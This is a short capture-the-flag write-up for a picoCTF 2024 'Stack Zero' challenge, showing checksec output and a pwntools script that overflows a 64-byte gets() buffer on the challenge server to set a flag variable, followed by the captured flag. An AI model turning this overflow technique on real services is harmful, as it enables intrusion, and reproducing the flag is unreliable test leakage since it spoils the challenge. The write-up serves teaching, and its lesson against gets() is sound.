---
title: "Stack Zero — A Classic BOF Awakening"
ctf: "picoCTF 2024"
category: "pwn"
difficulty: "easy"
points: 100
date: "2024-04-12"
lat: 37.77
lng: -122.41
summary: "Walking through the most fundamental stack overflow: overwriting a local flag variable with `gets()`."
tags: ["bof", "gets", "stack"]
---

## Recon

The binary is a 64-bit ELF, NX enabled, no canary, no PIE.

```bash
$ checksec ./vuln
[*] '/ctf/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```

Main reads input with `gets()` into a 64-byte buffer. A flag variable sits right after.

## Exploit

We just need to overflow into `flag` and set it to a non-zero value.

```python
from pwn import *

io = remote("mercury.picoctf.net", 12345)
io.sendline(b"A" * 64 + b"B")
io.interactive()
```

> Lesson: `gets()` is forever cursed. Always use `fgets()`.

**Flag:** `picoCTF{st4ck_0v3rfl0w_b4by}`